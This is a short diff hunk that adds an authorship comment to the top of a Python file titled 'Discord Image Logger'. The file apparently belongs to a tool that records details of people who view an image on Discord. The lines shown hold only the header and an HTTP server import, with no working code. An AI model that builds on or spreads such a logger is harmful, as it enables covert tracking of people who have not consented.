@@ -1,4 +1,4 @@
-
+# Made and Tested by jsxtra
 # Discord Image Logger
 
 from http.server import BaseHTTPRequestHandler
